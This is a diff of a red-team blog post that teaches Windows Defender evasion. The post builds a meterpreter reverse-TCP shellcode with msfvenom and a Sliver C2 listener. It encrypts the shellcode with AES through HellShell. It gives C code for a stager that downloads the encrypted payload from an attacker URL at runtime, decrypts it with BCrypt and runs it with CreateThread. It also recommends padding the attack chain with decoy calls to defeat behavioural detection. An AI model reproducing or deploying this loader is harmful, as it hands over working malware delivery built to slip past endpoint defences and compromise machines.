@@ -13,21 +13,24 @@ In the [previous blog](https://nirajkharel.com.np/posts/payload-encryption-and-o
 As background, we will listen for a connection on the C2 server, use **msfvenom** to build a shellcode, use hellshell to encrypt the shellcode using AES, and then convert the unsigned char array into binary.  Create an executable program that downloads the binary shellcode, uses the key and IV that the hellshell provides to decrypt it, and then launches the current process. **How may this be useful?** The payload would not be detected as malicious since it is not hardcoded into the malicious application. It receives an encrypted payload during runtime, which again prevents the defender from knowing what is on it because it is encrypted. The payload then decrypts and runs into virtual memory to evade the defender and real-time monitoring.
 
 ## Shellcode Encryption
-There are different types to perform shellcode encryptions like XOR, RC4, but on this blog we wil discuss about Advanced Encryption Standard (AES) Encryption.
+There are different types to perform shellcode encryptions like XOR, RC4, but on this blog we will discuss about Advanced Encryption Standard (AES) Encryption.
+
 
 ### AES Encryption
-AES Encryption consists of a symmetric-key algorithm which uses same key for the encryption and decryption. It is one of the widely used encryption techniques that uses block ciphers like CBC and GCM. It means that it splits the plaintext into smaller blocks and encrypt those blocks to generate the cipher text. AES also uses Initialization Vector (IV) that provides randomness into the encryption process. IV is generally used to encrypt the first block and the cipher text of the each bock is used as the initiazation vector for the next block. 
+AES Encryption consists of a symmetric-key algorithm which uses same key for the encryption and decryption. It is one of the widely used encryption techniques that uses block ciphers like CBC and GCM. It means that it splits the plaintext into smaller blocks and encrypt those blocks to generate the cipher text. AES also uses Initialization Vector (IV) that provides randomness into the encryption process. IV is generally used to encrypt the first block and the cipher text of the each block is used as the initialization vector for the next block.
 
-I would suggest you go through [this youtube video from Neso Academy](https://www.youtube.com/watch?v=3MPkc-PFSRI) to understand in detaila bout the AES Encryption and how it works. Below is the image taken from the same video.
+I would suggest you go through [this youtube video from Neso Academy](https://www.youtube.com/watch?v=3MPkc-PFSRI) to understand in detail about the AES Encryption and how it works. Below is the image taken from the same video.
 
 <img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/aes-encryption-1.png">
 
 AES Encryption needs the block size to be 128-bits for both input and output, on our implementation we would split the shellcode into 128-bits block and in case the shellcode is not multiple of 128-bits, padding is used to increase the size of the shellcode.
 
-Below is an example which shows how we can use a tool like Supernova to encrypt the payload.
+Below is an example which shows how we can use a tool like Supernova to encrypt the payload. Observe the encrypted payload and generated key and IV of 32 and 16 byte respectively.
+
 <img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/aes-encryption-supernova-1.png">
 
-We will be using HellShell to encrypt the payload using AES and it also provides us the code chunk that can be used with the decryption along with the cipertext, key and IV. HellShell uses Windows **bcrypt.h** header to perform AES encryption and decryption. Below listed functions are the major one that is used to decrypt the encrypted blob. I would suggest you to go through each of the function from the link below.     
+We will be using HellShell to encrypt the payload using AES and it also provides us the code chunk that can be used with the decryption along with the ciphertext, key and IV. HellShell uses Windows **bcrypt.h** header to perform AES encryption and decryption. Below listed functions are the major ones that are used to decrypt the encrypted blob. I would suggest you to go through each of the functions from the link below.
+    
 
 | Function | Description |
 |----------|-------------|
@@ -40,10 +43,10 @@ We will be using HellShell to encrypt the payload using AES and it also provides
 | [BCryptCloseAlgorithmProvider](https://learn.microsoft.com/en-us/windows/win32/api/bcrypt/nf-bcrypt-bcryptclosealgorithmprovider) | Closes an algorithm provider. |
 
 
-We will go through the brief of each one of the function while we decrypt our msfvenom shellcode. For now, lets start with Stage I.
+We will go through the brief of each one of the functions while we decrypt our msfvenom shellcode. For now, let's start with Stage I.
 
 ## Stage I - Shellcode Generation and C2 Listener.
-The shellcode generation and listening for the connection on the Sliver C2 as same as what we did on the previous blog.  
+The shellcode generation and listening for the connection on the Sliver C2 is same as what we did on the previous blog.         
 
 ```bash
 # Creating a profile on the C2
@@ -59,7 +62,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.86 LPORT=8080 -f
 ```
 
 ## Stage II - Shellcode Encryption & Decryption
-Once we have the shellcode ready and transferred into our Windows attacking machiine, we will execute HellShell to generate our encrypted payload using below command:  
+Once we have the shellcode ready and transferred into our Windows attacking machine, we will execute HellShell to generate our encrypted payload using the below command:       
 ```powershell
 HellShell.exe .\win11-shellcode.bin aes
 ```
@@ -71,9 +74,10 @@ Note that the Helshell provides us the code to decrypt and the encrypted blob as
 The above decryption code consists of multiple functions as listed above. 
 
 **Bcrypt.lib and Headers**
-Since the required functions are located on Bcrypt.lib library, it needs to be imported first. Since Bcrypt.lib is a native Windows system DLL. NT_SUCCESS is used to determine whether it is loaded successfully.
+Since the required functions are located on Bcrypt.lib library, it needs to be imported first. Since Bcrypt.lib is a native Windows system DLL, NT_SUCCESS is used to determine whether it is loaded successfully.
 
-Similarly, the size of the key and IV are determined as 32 and 16 bytes i.e. 256 bits and 128 bits. This typically means that AES-256 key size is being used and each block size is always 16 bytes (128 bits).
+Similarly, the size of the key and IV are determined as 32 and 16 bytes i.e. 256 bits and 128 bits. This typically means that AES-256 key size
+
 
 `typedef struct _AES` is used to group together the variables and data needed for the decryption. 
 
@@ -102,7 +106,7 @@ typedef struct _AES {
 }AES, * PAES;
 ```     
 
-Next the code contains a function **InstallAesDecryption** where the actual decryption takes place. Observe that all of the variables defined earlier are passed into the function.    
+Next the code contains a function **InstallAesDecryption** where the actual decryption takes place. Observe that all of the variables defined earlier are passed into the function.         
 
 ```c
 BOOL InstallAesDecryption(PAES pAes) {
@@ -133,7 +137,7 @@ if (!NT_SUCCESS(STATUS)) {
 }
 ```
 
-Getting the size of the key object variable *pbKeyObject* which isused for **BCryptGenerateSymmetricKey** function later.       
+Getting the size of the key object variable *pbKeyObject* which is used for **BCryptGenerateSymmetricKey** function later on.       
 ```c
 STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0);
 if (!NT_SUCCESS(STATUS)) {
@@ -142,7 +146,7 @@ if (!NT_SUCCESS(STATUS)) {
 }
 ```
 
-Getting the size of the block used in the encryption, since this is AES and it should be 16 bytes.      
+Getting the size of the block used in the encryption, since this is AES and it should be 16 bytes.          
 ```c
 STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_BLOCK_LENGTH, (PBYTE)&dwBlockSize, sizeof(DWORD), &cbResult, 0);
 if (!NT_SUCCESS(STATUS)) {
@@ -151,7 +155,7 @@ if (!NT_SUCCESS(STATUS)) {
 }
 ```
 
-Checking if the block size if 16 bytes and allocating the memory for the key object using **HeapAlloc**.        
+Checking if the block size is 16 bytes and allocating the memory for the key object using **HeapAlloc**.        
 ```c
  if (dwBlockSize != 16) {
      bSTATE = FALSE; goto _EndOfFunc;
@@ -162,7 +166,7 @@ Checking if the block size if 16 bytes and allocating the memory for the key obj
  }
 ```
 
-Setting the Block Cipher mode to CBC i.e., 32 byute key and 16 byte IV. 
+Setting the Block Cipher mode to CBC i.e., 32 byte key and 16 byte IV. 
 ```c
  STATUS = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
  if (!NT_SUCCESS(STATUS)) {
@@ -189,7 +193,7 @@ if (!NT_SUCCESS(STATUS)) {
 }
 ```
 
-Allocing memory as of the size of cbPlainText and running BcryptDecrypt second time with **pbPlainText** as output buffer.      
+Allocating the memory as of the size of cbPlainText and running **BcryptDecrypt** second time with **pbPlainText** as output buffer.      
 ```c
  pbPlainText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbPlainText);
  if (pbPlainText == NULL) {
@@ -203,7 +207,7 @@ Allocing memory as of the size of cbPlainText and running BcryptDecrypt second t
  }
 ```
 
-Cleaning up the function before exiting it. It is used to set the key algorithm handle free and remove the details on the memory if they were used. Also, if the decryption is successful, the **bSTATE** is set to be true and it stores the decrypted plaintext and its size in the **AES** struct.   
+Cleaning up the function before exiting it. It is used to set the key algorithm handle free and remove the details from the memory if they were used. Also, if the decryption is successful, the **bSTATE** is set to true and it stores the decrypted plaintext and its size in the **AES** struct.    
 ```c
 _EndOfFunc:
     if (hKeyHandle) {
@@ -224,7 +228,7 @@ _EndOfFunc:
 }
 ```
 
-The HellShell also provides one additional function called **SimpleDecryption**, which is just a wrapper function for **InstallAesDecryption**. It first checks whether all the required input data like cipher text, size of the cipher text, key and IV are provided or valid and then initializes the **AES** structure. Finally it calls the **InstallAesDecryption** function and specifies the pointer to the decrypted buffer and the size.           
+The HellShell also provides one additional function called **SimpleDecryption**, which is just a wrapper function for **InstallAesDecryption**. It first checks whether all the required input data like ciphertext, size of the ciphertext, key and IV are provided or valid and then initializes the **AES** structure. Finally, it calls the **InstallAesDecryption** function and specifies the pointer to the decrypted buffer and the size.                 
 
 ```c
 BOOL SimpleDecryption(IN PVOID pCipherTextData, IN DWORD sCipherTextSize, IN PBYTE pKey, IN PBYTE pIv, OUT PVOID* pPlainTextData, OUT DWORD* sPlainTextSize) {
@@ -250,7 +254,7 @@ BOOL SimpleDecryption(IN PVOID pCipherTextData, IN DWORD sCipherTextSize, IN PBY
 ```
 
 ## Stage III - Payload/Shellcode Staging.
-Until now we have our encryption version of our shellcode using AES and our decryption function ready. The idea is to get the encrypted shelcode during the runtime instead of hardcoding it into the application. This can be done using three Windows API functions **InternetOpenW**, **InternetOpenUrlW** and **InternetReadFile**.
+Until now we have our encryption version of our shellcode using AES and our decryption function ready. The idea is to get the encrypted shellcode during runtime instead of hardcoding it into the application. This can be done using three Windows API functions **InternetOpenW**, **InternetOpenUrlW**, and **InternetReadFile**.
 
 ### [InternetOpenW](https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopenw)
 It is a function to open and initialize the handle to the internet session. It consists of five input parameters which are:          
@@ -263,7 +267,7 @@ HINTERNET InternetOpenW(
   [in] DWORD   dwFlags
 );
 ```
-The paremters **lpszAgent** is used to define the user agent in the HTTP protocol. Similarly, **dwAccessType** parameter is used to define what sort of access is required. The parameters **lpszProxy** and **lpszProxyBypass** are used if we need to setup a proxy or bypass the proxy and the parameter **dwFlags** is used to determine where to make the network retest or gain the entities from the cache. 
+The parameters **lpszAgent** is used to define the user agent in the HTTP protocol. Similarly, **dwAccessType** parameter is used to define what sort of access is required. The parameters **lpszProxy** and **lpszProxyBypass** are used if we need to set up a proxy or bypass the proxy and the parameter **dwFlags** is used to determine whether to make the network request or gain the entities from the cache. 
 
 ### [InternetOpenUrlW](https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopenurlw)
 InternetOpenUrlW function is used to get the handle to the shellcode specified by the HTTP URL. It consists of six parameters:    
@@ -278,7 +282,7 @@ HINTERNET InternetOpenUrlW(
 );
 ```
 
-The first one is the handle to the internet session, second one is the URL that contains the shellcode, third one specifies the request headers to be sent to the HTTP server, fourth one is to specify the size of the headers if any additional header is requried, the fifth one **dwFlags** contains different flags that can be provided like **INTERNET_FLAG_HYPERLINK** and **INTERNET_FLAG_IGNORE_CERT_DATE_INVALID** that forces the session to reload in case of no expire time and no last modified time and ignores the SSL/TLS validity of the URL. The last one contains pointer to a variable if any data needs to be passed into the server.
+The first one is the handle to the internet session, the second one is the URL that contains the shellcode, the third one specifies the request headers to be sent to the HTTP server, the fourth one specifies the size of the headers if any additional header is required, the fifth one **dwFlags** contains different flags that can be provided like **INTERNET_FLAG_HYPERLINK** and **INTERNET_FLAG_IGNORE_CERT_DATE_INVALID**, which forces the session to reload in case of no expiry time and no last modified time and ignores the SSL/TLS validity of the URL. The last one contains a pointer to a variable if any data needs to be passed into the server.
 
 ### [InternetReadFile](https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetreadfile)
 The third one is the InternetReadFile function that reads the data from a handle provided by **InternetOpenUrlW**.            
@@ -290,9 +294,10 @@ BOOL InternetReadFile(
   [out] LPDWORD   lpdwNumberOfBytesRead
 );
 ```
-It consists of two input parameters and two output in which the first one is the handle to the URL, second parameter provides pointer to the buffer that receives the data. Third one requires the number of bytes to be read and the fourth one provides a pointer to the actual number of bytes read.
+It consists of two input parameters and two output parameters in which the first one is the handle to the URL, the second parameter provides a pointer to the buffer that receives the data. The third one requires the number of bytes to be read, and the fourth one provides a pointer to the actual number of bytes read.
 
-Since now we have an overview of how to receive the data from the URL, its the time for the implementation. Lets create a function called **ShellcodeFormUrl** which provides pointer to the received data and the size of the encrypted data. Below are the parameter initialized on the functions.
+Since now we have an overview of how to receive the data from the URL, it's time for the implementation. Let's create a function called **ShellcodeFromUrl** which provides a pointer to the received data and the size of the encrypted data. Below are the parameters initialized in the function.
+
 - ` HINTERNET hInternet;` - Handle to the internet session text data.
 - `HINTERNET hInternetShellcode;` - Handle to the URL connection
 - `DWORD dwBytesRead = NULL;` - Number of bytes read during each iteration.
@@ -320,7 +325,7 @@ Next step is to create a handle to the internet session.
     }
 ```
 
-Once we have the handle to the internet, session, open the handle to the shellcode specified by HTTP URL.       
+Once we have the handle to the internet session, open the handle to the shellcode specified by HTTP URL.       
 ```c
     hInternetShellcode = InternetOpenUrlW(hInternet, L"http://192.168.1.86:1337/encrypted_payload.bin", NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
     if (hInternetShellcode == NULL) {
@@ -329,12 +334,13 @@ Once we have the handle to the internet, session, open the handle to the shellco
     }
 ```
 
-We need to allocate a specific number of bytes before calling the **InternetReadFile** function. Initially it has been defined as 1024 bytes. But, the payload would not be 1024 bytes every time it would result in crash during the decryption if we do not have every block of the payload on it.    
+Before calling the **InternetReadFile** function, we need to allocate a fixed amount of memory. Initially, this is set to 1024 bytes. However, since the payload size may vary and is not always exactly 1024 bytes, failing to allocate the full payload could cause the decryption process to crash if any block is missing.     
+        
 ```c
 pTmpBuffer = (PBYTE)LocalAlloc(LPTR, 1024);
 ```
 
-The solution to the above problem is to create a loop during the **InternetOpenUrlW** function. The loop reads 1024 bytes using a varialbe **pTmpBuffer** from the server during each iteration and appends the data into a variable **pBytes**. At the end of the loop it checks whether the size of **pTmpBuffer** is less than 1024, if the size is less than 1024 then it means it has came to the last chunk of the payload and breaks out of the loop.    
+The solution to the above problem is to create a loop during the **InternetOpenUrlW** function. The loop reads 1024 bytes using a variable **pTmpBuffer** from the server during each iteration and appends the data into a variable **pBytes**. At the end of the loop it checks whether the size of **pTmpBuffer** is less than 1024, if the size is less than 1024 then it means it has come to the last chunk of the payload and breaks out of the loop.       
 ```c
     // Allocate 1024 bytes for temporary storage
     pTmpBuffer = (PBYTE)LocalAlloc(LPTR, 1024);
@@ -374,7 +380,7 @@ The solution to the above problem is to create a loop during the **InternetOpenU
     }
 ```
 
-At the end the pointers are set for the data accessed through the server and the size of the data.      
+At the end, the pointers are set for the data accessed through the server and the size of the data.      
 ```c
     // Store the address of the complete shellcode buffer
     *pPayloadBytes = pBytes;
@@ -385,11 +391,11 @@ At the end the pointers are set for the data accessed through the server and the
 }
 ```
 
-Now since we have most of our functions ready i.e, reading the encrypted shellcode and decrypting the shellcode, we can proceed towards the shellcode injection. The process is same as we did it on the previous blog which consists of allocating the virtual memory space, copying the shellcode into the allocated memory, defining the memory address to be executable and executing the shellcode using CreateThread.
+Now since we have most of our functions ready, i.e., reading the encrypted shellcode and decrypting the shellcode, we can proceed towards the shellcode injection. The process is the same as we did in the previous blog which consists of allocating the virtual memory space, copying the shellcode into the allocated memory, defining the memory address to be executable, and executing the shellcode using CreateThread.
 
 ## Stage IV - Injection
 
-We can either create a seperate function to perform the shellcode injection or use the main function as well. The main function calls the above **ShellcodeFromUrl** and saves the output on the variables **Size** and **Bytes**. Next, the **SimpleDecryption** is called using the appropriate key, IV and the above **Size** and **Bytes**. The **SimpleDecryption** function in itself calls the **InstallAesDecryption** function and provides decrypted shellcode and its size as variables **pPlaintext** and **dwPlainSize**. Once that is gained, shellcode injection is performed.   
+WWe can either create a separate function to perform the shellcode injection or use the main function as well. The main function calls the above **ShellcodeFromUrl** and saves the output in the variables **Size** and **Bytes**. Next, the **SimpleDecryption** is called using the appropriate key, IV, and the above **Size** and **Bytes**. The **SimpleDecryption** function itself calls the **InstallAesDecryption** function and provides the decrypted shellcode and its size as variables **pPlaintext** and **dwPlainSize**. Once that is obtained, shellcode injection is performed.  
 
 ```c
 int main() {
@@ -497,7 +503,8 @@ int main() {
     getchar();
 }
 ```
-**Note:** Remember to insert some random methods within each of the above steps. This will help us break the attack chain and potentially bypass the behavioral detection capabilities of Windows Defender. For this demonstration, the method below for enumerating the username of the current machine has been inserted between each of the steps.    
+**Note:** Remember to insert some random methods within each of the above steps. This will help us break the attack chain and potentially bypass the behavioral detection capabilities of Windows Defender. For this demonstration, the method below for enumerating the username of the current machine has been inserted between each of the steps.
+   
 
 ```c
         // Breaking attack chain
@@ -844,7 +851,7 @@ Execute the payload on the completely patched Windows 11 Pro 22H2 machine and ob
 <img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/aes-encryption-6.gif">
 
 ## Important
-Note that during the payload encryption phase, the payload is encrypted using HellShell which provides the array of encrypted data. We need to convert that array into the binary file. We can write a simple code which opens a file called **encrypted_shellcode.bin** in binary write mode and write the entire contents of the AES cipher text to the file using **fwrite**. This file is the actual file that needs to be hosted on the attacker server.     
+Note that during the payload encryption phase, the payload is encrypted using HellShell which provides the array of encrypted data. We need to convert that array into a binary file. We can write a simple code which opens a file called **encrypted_shellcode.bin** in binary write mode and writes the entire contents of the AES ciphertext to the file using **fwrite**. This file is the actual file that needs to be hosted on the attacker server.    
 ```c
 #include <stdio.h>
 
